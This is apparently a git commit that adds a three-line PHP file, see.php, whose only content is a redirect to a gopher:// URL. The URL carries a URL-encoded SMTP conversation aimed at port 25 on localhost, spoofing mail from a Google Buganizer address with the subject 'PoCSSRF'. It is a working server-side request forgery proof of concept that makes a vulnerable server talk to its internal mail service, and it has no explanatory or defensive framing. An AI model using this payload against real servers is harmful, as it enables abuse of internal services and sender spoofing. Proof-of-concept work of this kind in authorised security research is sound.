8d024e0d49a6e67f6ddd966ac2ecd8be500dcdfd
Sanidhya Ved <sanidhyaved@gmail.com>
2022-06-15 23:23:49 +0530

    Add files via upload

---
+++ see.php
@@ -0,0 +1,3 @@
+<?php
+header(‘location: gopher://127.0.0.1:25/_MAIL%20FROM:buganizer-system%40google.com%0ARCPT%20To%3Asanidhyaved%40gmail.com%0ADATA%0AFrom%3Abuganizer-system%40google.com%0ASubject%3APoCSSRF%0AMessage%3A%0A.’);
+?>
